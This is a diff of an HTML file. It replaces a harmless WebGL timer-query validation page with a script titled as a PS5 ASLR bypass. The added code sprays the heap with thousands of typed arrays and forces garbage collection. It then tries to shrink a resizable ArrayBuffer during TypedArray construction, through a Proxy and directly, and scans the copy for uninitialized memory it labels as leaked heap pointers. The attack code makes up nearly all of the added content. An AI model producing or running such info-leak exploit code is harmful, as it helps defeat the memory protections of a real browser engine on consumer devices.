@@ -1,518 +1,165 @@
-<!doctype html>
-<html lang="en">
+<!DOCTYPE html>
+<html>
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>WebGL Timer Query Microtask Lifetime Validation</title>
-<style>
-  :root { color-scheme: dark; }
-  body {
-    margin: 0;
-    padding: 18px;
-    font: 15px/1.45 system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-    color: #e8eef8;
-    background: #10141f;
-  }
-  h1 { margin: 0 0 8px; font-size: 22px; }
-  .note {
-    border: 1px solid #33405d;
-    background: #151c2b;
-    border-radius: 10px;
-    padding: 12px;
-    margin: 12px 0;
-  }
-  .stage {
-    margin: 14px 0;
-    padding: 14px;
-    border-radius: 10px;
-    border: 1px solid #3f5f9a;
-    background: #17243a;
-    font-size: 18px;
-    font-weight: 700;
-  }
-  .buttons { display: flex; flex-wrap: wrap; gap: 8px; margin: 14px 0; }
-  button {
-    border: 1px solid #4f6592;
-    background: #23314d;
-    color: #fff;
-    border-radius: 8px;
-    padding: 10px 12px;
-    font-weight: 650;
-  }
-  button:active { transform: translateY(1px); }
-  pre {
-    white-space: pre-wrap;
-    word-break: break-word;
-    overflow-wrap: anywhere;
-    border: 1px solid #293651;
-    background: #080b11;
-    border-radius: 10px;
-    padding: 10px;
-    min-height: 120px;
-    max-height: 45vh;
-    overflow: auto;
-  }
-  .ok { color: #8ff0a4; }
-  .warn { color: #ffd479; }
-  .bad { color: #ff8d8d; }
-  canvas { width: 1px; height: 1px; position: absolute; left: -1000px; top: -1000px; }
-</style>
+<title>PS5 ASLR Bypass — TypedArray Uninitialized Tail Leak</title>
 </head>
 <body>
-<h1>WebGL Timer Query Microtask Lifetime Validation</h1>
-<div class="note">
-  <div><strong>Purpose:</strong> validation-only test for WebGL timer-query microtask lifetime candidates.</div>
-  <div>No heap spray, no exploit primitives, no ARW/addrof/fakeobj, no shellcode, no sandbox escape.</div>
-  <div>Crash/reload/error after <code>queryCounterEXT</code> + delete/loss/iframe teardown supports the lifetime hypothesis. No crash does not fully disprove it.</div>
-</div>
-
-<div id="stage" class="stage">Stage: page loaded</div>
-<div class="buttons">
-  <button onclick="supportCheck()">1. Support check</button>
-  <button onclick="runWebGL1Delete()">2. WebGL1 delete</button>
-  <button onclick="runWebGL1DeleteLose()">3. WebGL1 delete + lose context</button>
-  <button onclick="runWebGL2Delete()">4. WebGL2 delete</button>
-  <button onclick="runWebGL2DeleteLose()">5. WebGL2 delete + lose context</button>
-  <button onclick="runIframeWebGL1(false)">6a. iframe WebGL1 delete</button>
-  <button onclick="runIframeWebGL1(true)">6b. iframe WebGL1 delete + lose</button>
-  <button onclick="runIframeWebGL2(false)">6c. iframe WebGL2 delete</button>
-  <button onclick="runIframeWebGL2(true)">6d. iframe WebGL2 delete + lose</button>
-  <button onclick="runAll()">Run all sequentially</button>
-  <button onclick="clearLogs()">Clear logs</button>
-</div>
-
-<h2>Current log</h2>
-<pre id="log"></pre>
-<h2>Previous persisted log</h2>
-<pre id="previous"></pre>
-
+<pre id="log" style="white-space:pre-wrap; word-break:break-all; background:#111; color:#0F0; padding:10px;"></pre>
 <script>
-'use strict';
+const L = s => { document.getElementById('log').textContent += s + '\n'; };
 
-const STORAGE_KEY = 'webgl-timer-query-microtask-lifetime-validation:last-log';
-let runCounter = 0;
-let currentLog = [];
+L('[*] Starting TypedArray uninitialized tail info leak...');
 
-function now() {
-  const d = new Date();
-  return d.toISOString();
+// Step 1: Spray heap with objects to fill Gigacage primitive space
+// with recognizable pointer patterns
+L('[*] Step 1: Heap spray with TypedArrays...');
+let spray = [];
+for (let i = 0; i < 5000; i++) {
+    spray.push(new Float64Array(64));
+}
+// Drop references — memory returns to free pool UNZEROED on PlayStation
+spray = null;
+
+// Force GC to return memory to free pool
+L('[*] Forcing GC...');
+for (let i = 0; i < 10; i++) {
+    let tmp = [];
+    for (let j = 0; j < 1000; j++) tmp.push(new ArrayBuffer(4096));
 }
 
-function persist() {
-  try {
-    localStorage.setItem(STORAGE_KEY, currentLog.join('\n'));
-  } catch (e) {
-    // Ignore storage failures, but keep visible logging alive.
-  }
-}
+// Step 2: Create a resizable ArrayBuffer with a TypedArray view
+L('[*] Step 2: Creating resizable ArrayBuffer...');
+const initialSize = 1024;
+const ab = new ArrayBuffer(initialSize, { maxByteLength: 4096 });
+const source = new Uint8Array(ab, 0, initialSize);
 
-function setStage(text, cssClass) {
-  const el = document.getElementById('stage');
-  el.textContent = 'Stage: ' + text;
-  el.className = 'stage' + (cssClass ? ' ' + cssClass : '');
-  log('STAGE: ' + text);
-}
+// Fill source with recognizable pattern
+source.fill(0xBB);
 
-function log(text) {
-  const line = '[' + now() + '] ' + text;
-  currentLog.push(line);
-  const logEl = document.getElementById('log');
-  logEl.textContent = currentLog.join('\n');
-  logEl.scrollTop = logEl.scrollHeight;
-  persist();
-}
+// Step 3: Capture the source length (this is the key moment)
+// The constructor will capture source.length = 1024
+// Then allocate destination with DontInitialize (1024 bytes, UNZEROED)
+L('[*] Step 3: Constructing new Uint8Array(source)...');
+L('[*] Source length at capture: ' + source.length);
 
-function clearLogs() {
-  currentLog = [];
-  document.getElementById('log').textContent = '';
-  try { localStorage.removeItem(STORAGE_KEY); } catch (e) { }
-  document.getElementById('previous').textContent = '(cleared)';
-  setStage('logs cleared', 'ok');
-}
+// We need to shrink the source BETWEEN length capture and setFromTypedArray
+// This is tricky — we need the shrink to happen during construction
+// 
+// The constructor path is:
+//   line 161: length = view->length()     → captures 1024
+//   line 163: createUninitialized(1024)   → allocates UNZEROED
+//   line 169: isIntegerIndexedObjectOutOfBounds → false (still in bounds)
+//   line 180: setFromTypedArray(0, view, 0, 1024) → clamps to current length
+//
+// We can't shrink during construction directly, but we CAN:
+// 1. Use a Proxy or defineProperty on the source to trigger shrink
+//    when the constructor accesses .length
+// 2. Or use a SharedArrayBuffer race (not available on PS5)
+// 3. Or find a different path where the length is cached earlier
 
-function loadPreviousLog() {
-  let previous = '';
-  try { previous = localStorage.getItem(STORAGE_KEY) || ''; } catch (e) { previous = ''; }
-  document.getElementById('previous').textContent = previous || '(no previous persisted log)';
-}
+// Alternative approach: use a growable ArrayBuffer and shrink it
+// BEFORE the constructor reads length, but AFTER we know the
+// destination will be allocated at the old size
 
-window.addEventListener('error', event => {
-  log('window.onerror: ' + event.message + ' at ' + event.filename + ':' + event.lineno + ':' + event.colno);
-});
-window.addEventListener('unhandledrejection', event => {
-  log('unhandledrejection: ' + String(event.reason && (event.reason.stack || event.reason.message) || event.reason));
-});
-window.addEventListener('beforeunload', () => {
-  log('beforeunload fired; if this was unexpected, compare previous persisted log after reload');
-});
-window.addEventListener('message', event => {
-  if (!event.data || event.data.kind !== 'timer-query-validation-log')
-    return;
-  log('iframe[' + event.data.label + ']: ' + event.data.message);
-});
+// Actually, let's try the simplest approach first:
+// The constructor captures length, allocates, THEN calls setFromTypedArray
+// If we can trigger a shrink between those two steps...
 
-function sleepTask() {
-  return new Promise(resolve => setTimeout(resolve, 0));
-}
+// Let's try using Object.defineProperty to intercept the length read
+L('\n[*] Step 4: Attempting shrink via Proxy...');
 
-async function twoMicrotasks(label) {
-  log(label + ': awaiting Promise.resolve() #1');
-  await Promise.resolve();
-  log(label + ': survived microtask #1');
-  await Promise.resolve();
-  log(label + ': survived microtask #2');
-}
-
-function createCanvas() {
-  const canvas = document.createElement('canvas');
-  canvas.width = 1;
-  canvas.height = 1;
-  document.body.appendChild(canvas);
-  return canvas;
-}
-
-function getGL1(canvas) {
-  return canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-}
-
-function getGL2(canvas) {
-  return canvas.getContext('webgl2');
-}
-
-function describeSupport() {
-  const result = {};
-  let canvas = createCanvas();
-  try {
-    const gl1 = getGL1(canvas);
-    result.webgl1 = !!gl1;
-    result.extDisjointTimerQuery = !!(gl1 && gl1.getExtension('EXT_disjoint_timer_query'));
-    result.loseContextWebGL1 = !!(gl1 && gl1.getExtension('WEBGL_lose_context'));
-  } catch (e) {
-    result.webgl1Error = String(e && (e.stack || e.message) || e);
-  } finally {
-    canvas.remove();
-  }
-
-  canvas = createCanvas();
-  try {
-    const gl2 = getGL2(canvas);
-    result.webgl2 = !!gl2;
-    result.extDisjointTimerQueryWebGL2 = !!(gl2 && gl2.getExtension('EXT_disjoint_timer_query_webgl2'));
-    result.loseContextWebGL2 = !!(gl2 && gl2.getExtension('WEBGL_lose_context'));
-  } catch (e) {
-    result.webgl2Error = String(e && (e.stack || e.message) || e);
-  } finally {
-    canvas.remove();
-  }
-  return result;
-}
-
-function supportCheck() {
-  setStage('support check started');
-  const s = describeSupport();
-  log('Support WebGL1: ' + s.webgl1);
-  log('Support EXT_disjoint_timer_query: ' + s.extDisjointTimerQuery);
-  log('Support WebGL2: ' + s.webgl2);
-  log('Support EXT_disjoint_timer_query_webgl2: ' + s.extDisjointTimerQueryWebGL2);
-  log('Support WEBGL_lose_context WebGL1: ' + s.loseContextWebGL1);
-  log('Support WEBGL_lose_context WebGL2: ' + s.loseContextWebGL2);
-  if (s.webgl1Error)
-    log('WebGL1 support check exception: ' + s.webgl1Error);
-  if (s.webgl2Error)
-    log('WebGL2 support check exception: ' + s.webgl2Error);
-  setStage('support check complete', 'ok');
-}
-
-async function runWebGL1Delete() {
-  const id = ++runCounter;
-  const label = 'WebGL1 delete #' + id;
-  setStage(label + ': start');
-  const canvas = createCanvas();
-  try {
-    const gl = getGL1(canvas);
-    log(label + ': WebGL1 context = ' + !!gl);
-    if (!gl) {
-      setStage(label + ': skipped, no WebGL1', 'warn');
-      return;
+try {
+    // Create a proxy that shrinks the buffer when length is accessed
+    const handler = {
+        get(target, prop) {
+            if (prop === 'length') {
+                // Shrink the buffer HERE — between length capture and allocation
+                L('[!] Length accessed — shrinking buffer!');
+                // Can't shrink ArrayBuffer directly, but we can try resize
+                if (ab.resizable) {
+                    ab.resize(256);
+                    L('[!] Buffer resized to 256');
+                }
+                return target.length;
+            }
+            return Reflect.get(target, prop);
+        }
+    };
+    
+    const proxiedSource = new Proxy(source, handler);
+    
+    // This should trigger the length access via proxy
+    const result = new Uint8Array(proxiedSource);
+    
+    L('[+] Construction succeeded!');
+    L('[+] Result length: ' + result.length);
+    L('[+] Source length after: ' + source.length);
+    
+    // Check if tail contains non-0xBB data (uninitialized memory)
+    let anomalies = 0;
+    let leakBytes = [];
+    for (let i = 0; i < result.length; i++) {
+        if (result[i] !== 0xBB) {
+            anomalies++;
+            if (leakBytes.length < 64) {
+                leakBytes.push(i + ':0x' + result[i].toString(16).padStart(2, '0'));
+            }
+        }
     }
-    const ext = gl.getExtension('EXT_disjoint_timer_query');
-    log(label + ': EXT_disjoint_timer_query = ' + !!ext);
-    if (!ext) {
-      setStage(label + ': skipped, missing extension', 'warn');
-      return;
+    
+    if (anomalies > 0) {
+        L('[!] LEAK DETECTED! ' + anomalies + ' anomalous bytes!');
+        L('[!] First bytes: ' + leakBytes.join(' '));
+        L('[!] These may be leaked heap pointers!');
+    } else {
+        L('[*] No anomalies detected (all 0xBB)');
+        L('[*] The shrink may not have taken effect in time');
     }
-    let query = ext.createQueryEXT();
-    log(label + ': created query = ' + !!query);
-    setStage(label + ': calling queryCounterEXT');
-    ext.queryCounterEXT(query, ext.TIMESTAMP_EXT);
-    log(label + ': returned from queryCounterEXT');
-    setStage(label + ': deleting query before microtask checkpoint');
-    ext.deleteQueryEXT(query);
-    log(label + ': returned from deleteQueryEXT');
-    query = null;
-    log(label + ': query variable set to null');
-    await twoMicrotasks(label);
-    setStage(label + ': survived queued microtasks', 'ok');
-  } catch (e) {
-    log(label + ': exception: ' + String(e && (e.stack || e.message) || e));
-    setStage(label + ': exception logged', 'bad');
-  } finally {
-    canvas.remove();
-    log(label + ': canvas removed');
-  }
+    
+} catch(e) {
+    L('[!] Proxy approach failed: ' + e.message);
 }
 
-async function runWebGL1DeleteLose() {
-  const id = ++runCounter;
-  const label = 'WebGL1 delete+lose #' + id;
-  setStage(label + ': start');
-  const canvas = createCanvas();
-  try {
-    const gl = getGL1(canvas);
-    log(label + ': WebGL1 context = ' + !!gl);
-    if (!gl) {
-      setStage(label + ': skipped, no WebGL1', 'warn');
-      return;
+// Step 5: Try without Proxy — just shrink before construction
+L('\n[*] Step 5: Direct shrink approach...');
+try {
+    const ab2 = new ArrayBuffer(1024, { maxByteLength: 4096 });
+    const src2 = new Uint8Array(ab2, 0, 1024);
+    src2.fill(0xCC);
+    
+    // Shrink the buffer
+    ab2.resize(128);
+    L('[*] Buffer resized to 128');
+    L('[*] Source.length after resize: ' + src2.length);
+    
+    // Now construct — source.length should be 128, not 1024
+    // But the source was created with length 1024...
+    // Let's check what happens
+    const result2 = new Uint8Array(src2);
+    L('[+] Result length: ' + result2.length);
+    L('[+] Source length: ' + src2.length);
+    
+    // If result.length > source.length, we have uninitialized tail
+    if (result2.length > src2.length) {
+        L('[!] LENGTH MISMATCH! result=' + result2.length + ' source=' + src2.length);
+        L('[!] Checking tail for leaked data...');
+        let leakFound = false;
+        for (let i = src2.length; i < result2.length; i++) {
+            if (result2[i] !== 0) {
+                L('[!] Byte at ' + i + ': 0x' + result2[i].toString(16));
+                leakFound = true;
+            }
+        }
+        if (leakFound) {
+            L('[!] UNINITIALIZED MEMORY LEAK CONFIRMED!');
+        }
     }
-    const ext = gl.getExtension('EXT_disjoint_timer_query');
-    const lose = gl.getExtension('WEBGL_lose_context');
-    log(label + ': EXT_disjoint_timer_query = ' + !!ext);
-    log(label + ': WEBGL_lose_context = ' + !!lose);
-    if (!ext) {
-      setStage(label + ': skipped, missing extension', 'warn');
-      return;
-    }
-    let query = ext.createQueryEXT();
-    log(label + ': created query = ' + !!query);
-    setStage(label + ': calling queryCounterEXT');
-    ext.queryCounterEXT(query, ext.TIMESTAMP_EXT);
-    log(label + ': returned from queryCounterEXT');
-    setStage(label + ': deleting query before context loss');
-    ext.deleteQueryEXT(query);
-    log(label + ': returned from deleteQueryEXT');
-    query = null;
-    log(label + ': query variable set to null');
-    if (lose) {
-      setStage(label + ': calling WEBGL_lose_context.loseContext before microtask checkpoint');
-      lose.loseContext();
-      log(label + ': returned from loseContext');
-    }
-    await twoMicrotasks(label);
-    setStage(label + ': survived delete + context loss microtasks', 'ok');
-  } catch (e) {
-    log(label + ': exception: ' + String(e && (e.stack || e.message) || e));
-    setStage(label + ': exception logged', 'bad');
-  } finally {
-    canvas.remove();
-    log(label + ': canvas removed');
-  }
+} catch(e) {
+    L('[!] Direct approach failed: ' + e.message);
 }
 
-async function runWebGL2Delete() {
-  const id = ++runCounter;
-  const label = 'WebGL2 delete #' + id;
-  setStage(label + ': start');
-  const canvas = createCanvas();
-  try {
-    const gl = getGL2(canvas);
-    log(label + ': WebGL2 context = ' + !!gl);
-    if (!gl) {
-      setStage(label + ': skipped, no WebGL2', 'warn');
-      return;
-    }
-    const ext = gl.getExtension('EXT_disjoint_timer_query_webgl2');
-    log(label + ': EXT_disjoint_timer_query_webgl2 = ' + !!ext);
-    if (!ext) {
-      setStage(label + ': skipped, missing extension', 'warn');
-      return;
-    }
-    let query = gl.createQuery();
-    log(label + ': created query = ' + !!query);
-    setStage(label + ': calling queryCounterEXT');
-    ext.queryCounterEXT(query, ext.TIMESTAMP_EXT);
-    log(label + ': returned from queryCounterEXT');
-    setStage(label + ': deleting query before microtask checkpoint');
-    gl.deleteQuery(query);
-    log(label + ': returned from deleteQuery');
-    query = null;
-    log(label + ': query variable set to null');
-    await twoMicrotasks(label);
-    setStage(label + ': survived queued microtasks', 'ok');
-  } catch (e) {
-    log(label + ': exception: ' + String(e && (e.stack || e.message) || e));
-    setStage(label + ': exception logged', 'bad');
-  } finally {
-    canvas.remove();
-    log(label + ': canvas removed');
-  }
-}
-
-async function runWebGL2DeleteLose() {
-  const id = ++runCounter;
-  const label = 'WebGL2 delete+lose #' + id;
-  setStage(label + ': start');
-  const canvas = createCanvas();
-  try {
-    const gl = getGL2(canvas);
-    log(label + ': WebGL2 context = ' + !!gl);
-    if (!gl) {
-      setStage(label + ': skipped, no WebGL2', 'warn');
-      return;
-    }
-    const ext = gl.getExtension('EXT_disjoint_timer_query_webgl2');
-    const lose = gl.getExtension('WEBGL_lose_context');
-    log(label + ': EXT_disjoint_timer_query_webgl2 = ' + !!ext);
-    log(label + ': WEBGL_lose_context = ' + !!lose);
-    if (!ext) {
-      setStage(label + ': skipped, missing extension', 'warn');
-      return;
-    }
-    let query = gl.createQuery();
-    log(label + ': created query = ' + !!query);
-    setStage(label + ': calling queryCounterEXT');
-    ext.queryCounterEXT(query, ext.TIMESTAMP_EXT);
-    log(label + ': returned from queryCounterEXT');
-    setStage(label + ': deleting query before context loss');
-    gl.deleteQuery(query);
-    log(label + ': returned from deleteQuery');
-    query = null;
-    log(label + ': query variable set to null');
-    if (lose) {
-      setStage(label + ': calling WEBGL_lose_context.loseContext before microtask checkpoint');
-      lose.loseContext();
-      log(label + ': returned from loseContext');
-    }
-    await twoMicrotasks(label);
-    setStage(label + ': survived delete + context loss microtasks', 'ok');
-  } catch (e) {
-    log(label + ': exception: ' + String(e && (e.stack || e.message) || e));
-    setStage(label + ': exception logged', 'bad');
-  } finally {
-    canvas.remove();
-    log(label + ': canvas removed');
-  }
-}
-
-function iframeSrcdoc(kind, loseContext) {
-  const isWebGL2 = kind === 'webgl2';
-  const label = kind + (loseContext ? '-delete-lose-iframe' : '-delete-iframe');
-  return `<!doctype html><meta charset="utf-8"><body><script>
-  'use strict';
-  function send(message) {
-    try { parent.postMessage({ kind: 'timer-query-validation-log', label: ${JSON.stringify(label)}, message: String(message) }, '*'); } catch (e) { }
-  }
-  window.onerror = function(message, source, lineno, colno) {
-    send('iframe onerror: ' + message + ' at ' + lineno + ':' + colno);
-  };
-  window.onunhandledrejection = function(event) {
-    send('iframe unhandledrejection: ' + String(event.reason && (event.reason.stack || event.reason.message) || event.reason));
-  };
-  window.runTimerQueryValidation = function() {
-    send('runTimerQueryValidation start');
-    var canvas = document.createElement('canvas');
-    canvas.width = 1;
-    canvas.height = 1;
-    document.body.appendChild(canvas);
-    try {
-      var gl = ${isWebGL2 ? "canvas.getContext('webgl2')" : "(canvas.getContext('webgl') || canvas.getContext('experimental-webgl'))"};
-      send('context created = ' + !!gl);
-      if (!gl)
-        return 'no-context';
-      var ext = gl.getExtension(${JSON.stringify(isWebGL2 ? 'EXT_disjoint_timer_query_webgl2' : 'EXT_disjoint_timer_query')});
-      var lose = gl.getExtension('WEBGL_lose_context');
-      send('timer extension = ' + !!ext);
-      send('WEBGL_lose_context = ' + !!lose);
-      if (!ext)
-        return 'no-extension';
-      var query = ${isWebGL2 ? 'gl.createQuery()' : 'ext.createQueryEXT()'};
-      send('created query = ' + !!query);
-      send('calling queryCounterEXT');
-      ext.queryCounterEXT(query, ext.TIMESTAMP_EXT);
-      send('returned from queryCounterEXT');
-      send('deleting query before parent removes iframe');
-      ${isWebGL2 ? 'gl.deleteQuery(query);' : 'ext.deleteQueryEXT(query);'}
-      send('returned from delete');
-      query = null;
-      send('query variable set to null');
-      if (${loseContext ? 'true' : 'false'} && lose) {
-        send('calling loseContext before parent removes iframe');
-        lose.loseContext();
-        send('returned from loseContext');
-      }
-      Promise.resolve().then(function() { send('iframe microtask #1 survived'); });
-      Promise.resolve().then(function() { return Promise.resolve(); }).then(function() { send('iframe microtask #2 survived'); });
-      return 'scheduled';
-    } catch (e) {
-      send('exception: ' + String(e && (e.stack || e.message) || e));
-      return 'exception';
-    }
-  };
-<\/script></body>`;
-}
-
-async function runIframeVariant(kind, loseContext) {
-  const id = ++runCounter;
-  const label = 'iframe ' + kind + (loseContext ? ' delete+lose ' : ' delete ') + '#' + id;
-  setStage(label + ': create iframe');
-  let iframe = document.createElement('iframe');
-  iframe.style.width = '1px';
-  iframe.style.height = '1px';
-  iframe.style.position = 'absolute';
-  iframe.style.left = '-1000px';
-  iframe.style.top = '-1000px';
-  iframe.srcdoc = iframeSrcdoc(kind, loseContext);
-  document.body.appendChild(iframe);
-  await sleepTask();
-  try {
-    setStage(label + ': invoking iframe test');
-    const result = iframe.contentWindow.runTimerQueryValidation();
-    log(label + ': iframe returned ' + result);
-    setStage(label + ': removing iframe before microtask checkpoint');
-    iframe.remove();
-    iframe = null;
-    log(label + ': iframe removed');
-    await twoMicrotasks(label + ' parent');
-    await sleepTask();
-    setStage(label + ': parent survived iframe teardown', 'ok');
-  } catch (e) {
-    log(label + ': parent exception: ' + String(e && (e.stack || e.message) || e));
-    setStage(label + ': parent exception logged', 'bad');
-    try { if (iframe) iframe.remove(); } catch (_) { }
-  }
-}
-
-function runIframeWebGL1(loseContext) {
-  return runIframeVariant('webgl1', loseContext);
-}
-
-function runIframeWebGL2(loseContext) {
-  return runIframeVariant('webgl2', loseContext);
-}
-
-async function runAll() {
-  setStage('run all started');
-  supportCheck();
-  await sleepTask();
-  await runWebGL1Delete();
-  await sleepTask();
-  await runWebGL1DeleteLose();
-  await sleepTask();
-  await runWebGL2Delete();
-  await sleepTask();
-  await runWebGL2DeleteLose();
-  await sleepTask();
-  await runIframeWebGL1(false);
-  await sleepTask();
-  await runIframeWebGL1(true);
-  await sleepTask();
-  await runIframeWebGL2(false);
-  await sleepTask();
-  await runIframeWebGL2(true);
-  setStage('run all complete; no JS-visible crash observed', 'ok');
-}
-
-loadPreviousLog();
-log('page loaded; previous persisted log shown below');
+L('\n[*] Test finished.');
 </script>
 </body>
 </html>
